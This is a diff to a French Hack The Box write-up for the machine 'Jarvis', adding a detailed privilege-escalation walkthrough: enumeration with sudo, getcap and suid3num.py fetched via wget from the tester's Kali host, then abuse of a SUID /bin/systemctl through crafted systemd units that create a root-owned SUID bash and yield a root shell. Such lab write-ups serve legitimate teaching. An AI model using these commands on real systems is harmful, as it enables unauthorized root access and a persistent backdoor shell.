@@ -1941,50 +1941,279 @@ L’accès au compte `pepper` est donc validé. Tu peux désormais passer à l'e
 
 {{< escalade-intro user="pepper" >}}
 
-### Vérification sudo
+### Vérification des droits `sudo`
+
+La première vérification consiste à examiner les commandes que l’utilisateur `pepper` peut éventuellement exécuter avec `sudo` :
 
 ```bash
 sudo -l
 ```
 
-### Exploration du contexte utilisateur
+La commande demande cependant le mot de passe de `pepper` :
 
-```bash
-whoami
-id
-pwd
-uname -a
-hostname
-find /home /opt -type f -readable 2>/dev/null
+```text
+[sudo] password for pepper:
 ```
 
-### Capabilities
+Comme tu ne connais pas ce mot de passe, tu ne peux pas exploiter directement une éventuelle règle `sudo`.
+
+### Recherche de capabilities Linux
+
+Tu recherches ensuite les fichiers auxquels des capabilities Linux particulières ont été attribuées :
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-### SUID
+La commande ne retourne aucun résultat.
+
+Aucun binaire disposant de capabilities exploitables n’est donc présent sur la machine.
+
+### Recherche des binaires SUID
+
+En suivant la recette {{< recette "privilege-escalation-linux" >}}, tu poursuis l’énumération avec `suid3num.py`.
+
+Depuis Kali, place-toi dans le répertoire contenant le script et démarre un serveur HTTP :
+
+```bash
+python3 -m http.server 8000
+```
+
+Depuis la session SSH ouverte avec `pepper`, télécharge ensuite le script dans `/dev/shm` :
+
+```bash
+cd /dev/shm
+wget http://10.10.15.96:8000/suid3num.py
+```
+
+Le répertoire `/dev/shm` convient bien à ce type de fichier temporaire. Il est généralement accessible en écriture par les utilisateurs non privilégiés et son contenu disparaît au redémarrage de la machine.
+
+Exécute ensuite le script :
 
 ```bash
 python3 suid3num.py
 ```
 
-Alternative :
+La sortie de `suid3num.py` met directement en évidence `/bin/systemctl` comme binaire SUID inhabituel et potentiellement exploitable :
 
-```bash
-find / -perm -4000 -type f 2>/dev/null
+```text
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+/bin/systemctl
+------------------------------
+
+[#] SUID Binaries in GTFO bins list (Hell Yeah!)
+------------------------------
+/bin/systemctl -~> https://gtfobins.github.io/gtfobins/systemctl/#suid
+------------------------------
+
+[&] Manual Exploitation (Binaries which create files on the system)
+------------------------------
+
+[&] Systemctl ( /bin/systemctl )
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+------------------------------
 ```
 
-### root.txt
+Le script t’indique donc immédiatement que `/bin/systemctl` constitue la piste intéressante et te fournit une procédure permettant de vérifier son exploitation.
 
-Une fois root, tu peux lire le flag final :
+### Validation de l’exécution privilégiée
+
+Tu commences par créer un fichier de service temporaire :
 
 ```bash
-cat /root/root.txt
+TF=$(mktemp).service
 ```
 
-Cette étape termine l’escalade de privilèges.
+La variable `TF` contient maintenant un chemin semblable à celui-ci :
+
+```text
+/tmp/tmp.Abc123.service
+```
+
+Crée ensuite une unité `systemd` de type `oneshot` :
+
+```bash
+cat > "$TF" <<'EOF'
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+Le type `oneshot` indique que le service doit exécuter une commande unique, puis se terminer.
+
+La directive suivante constitue l’élément essentiel :
+
+```ini
+ExecStart=/bin/sh -c "id > /tmp/output"
+```
+
+Lors du démarrage du service, la commande `id` sera exécutée et son résultat sera enregistré dans `/tmp/output`.
+
+Tu dois maintenant rendre cette unité accessible à `systemd` :
+
+```bash
+/bin/systemctl link "$TF"
+```
+
+La commande `link` crée un lien symbolique vers le fichier temporaire dans le répertoire utilisé par `systemd`.
+
+Active ensuite le service et démarre-le immédiatement :
+
+```bash
+/bin/systemctl enable --now "$TF"
+```
+
+L’option `enable` configure le service pour qu’il soit associé à la cible définie dans la section `[Install]`, tandis que l’option `--now` demande son démarrage immédiat.
+
+Tu peux alors vérifier si le fichier `/tmp/output` a bien été créé :
+
+```bash
+cat /tmp/output
+```
+
+Le résultat indique que la commande a été exécutée avec les privilèges de `root` :
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Cette vérification confirme que l’utilisateur `pepper` peut utiliser le binaire SUID `/bin/systemctl` pour faire exécuter une commande arbitraire par `systemd` avec l’UID `0`.
+
+### Création d’un Bash SUID appartenant à root
+
+Maintenant que l’exécution privilégiée est confirmée, tu peux créer une nouvelle unité chargée de générer une copie SUID de Bash.
+
+Commence par créer un nouveau nom de service temporaire :
+
+```bash
+TF=$(mktemp).service
+```
+
+Crée ensuite le contenu de l’unité :
+
+```bash
+cat > "$TF" <<'EOF'
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash-root; chown root:root /tmp/bash-root; chmod 4755 /tmp/bash-root"
+
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+La directive `ExecStart` exécute successivement trois commandes :
+
+```bash
+cp /bin/bash /tmp/bash-root
+```
+
+Cette première commande crée une copie de Bash dans `/tmp`.
+
+```bash
+chown root:root /tmp/bash-root
+```
+
+La deuxième attribue le fichier à l’utilisateur et au groupe `root`.
+
+```bash
+chmod 4755 /tmp/bash-root
+```
+
+La troisième applique les permissions `4755`.
+
+Le premier chiffre, `4`, active le bit SUID. Les trois chiffres suivants, `755`, accordent les permissions classiques suivantes :
+
+```text
+rwxr-xr-x
+```
+
+Enregistre ensuite la nouvelle unité auprès de `systemd` :
+
+```bash
+/bin/systemctl link "$TF"
+```
+
+Puis active-la et démarre-la immédiatement :
+
+```bash
+/bin/systemctl enable --now "$TF"
+```
+
+Une fois le service exécuté, vérifie les permissions de la copie de Bash :
+
+```bash
+ls -l /tmp/bash-root
+```
+
+Tu dois obtenir une ligne semblable à celle-ci :
+
+```text
+-rwsr-xr-x 1 root root ... /tmp/bash-root
+```
+
+Le fichier appartient bien à `root`.
+
+Le caractère `s` à la place du `x` dans les permissions du propriétaire confirme que le bit SUID est actif :
+
+```text
+-rwsr-xr-x
+```
+
+### Obtention du shell root
+
+Tu peux maintenant exécuter cette copie de Bash avec l’option `-p`, afin de conserver les privilèges effectifs hérités du bit SUID :
+
+```bash
+/tmp/bash-root -p
+```
+
+L’invite de commande change et indique que tu utilises désormais le Bash privilégié :
+
+```bash
+bash-root-4.4#
+```
+
+Vérifie alors ton identité :
+
+```bash
+bash-root-4.4# id
+uid=1000(pepper) gid=1000(pepper) euid=0(root) groups=1000(pepper)
+```
+
+L’UID réel reste celui de `pepper`, mais l’UID effectif `euid=0(root)` confirme que les commandes exécutées depuis ce shell disposent des privilèges de `root`.
+
+Tu peux également le confirmer avec :
+
+```bash
+bash-root-4.4# whoami
+root
+```
+
+Il ne te reste plus qu’à récupérer le drapeau final :
+
+```bash
+bash-root-4.4# cat /root/root.txt
+931cxxxxxxxxxxxxxxxxxxxxxxxx21ae
+```
+
+
+
+L’escalade de privilèges repose donc sur une mauvaise configuration du binaire `/bin/systemctl`, auquel le bit SUID a été attribué. Cette configuration permet à `pepper` de créer et de démarrer une unité `systemd` exécutée avec les privilèges de `root`. Le service est ensuite utilisé pour créer une copie SUID de Bash, donnant accès à un shell privilégié et permettant de terminer la machine `Jarvis`.
 
 ## Conclusion
 
